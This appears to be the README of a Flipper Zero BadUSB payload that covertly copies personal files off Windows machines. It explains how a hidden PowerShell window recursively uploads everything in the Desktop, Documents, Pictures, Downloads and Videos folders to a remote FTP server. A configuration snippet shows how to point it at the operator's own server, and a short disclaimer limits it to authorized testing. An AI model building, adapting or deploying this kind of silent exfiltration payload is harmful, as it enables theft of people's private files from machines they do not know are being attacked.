# 🐄 BadUSB FTP Uploader (Flipper Zero BadUSB)

## 🧬 Overview

This payload is engineered for Flipper Zero’s **BadUSB module** to silently exfiltrate personal files from a Windows machine using a hidden PowerShell session. Target folders include common user directories like Desktop, Documents, Pictures, Downloads, and Videos. All non-folder files are recursively uploaded to a remote **FTP server**.

> ⚠️ This script is for ethical use in **authorized environments only** (e.g., red team ops, penetration testing, informed demonstrations).

---

## 🛠️ How It Works

| Stage             | Action                                                                 |
|------------------|-------------------------------------------------------------------------|
| `DELAY`, `GUI r` | Opens Windows Run dialog after boot delay                              |
| PowerShell launch| Runs PowerShell with `-WindowStyle Hidden` to suppress UI              |
| FTP setup        | Declares FTP server, username, and password                            |
| Folder list      | Scans `$env:USERPROFILE` for folders: Desktop, Documents, etc.         |
| File loop        | Recursively finds files (excludes folders)                             |
| Upload           | Instantiates `System.Net.WebClient` and calls `UploadFile()` for each  |

---

## ✏️ How to Edit the FTP Target

To point this payload to your own FTP server:

```powershell
$ftpServer = "ftp.example.com"
$ftpUser   = "YOUR_FTP_USERNAME"
$ftpPass   = "YOUR_FTP_PASSWORD"
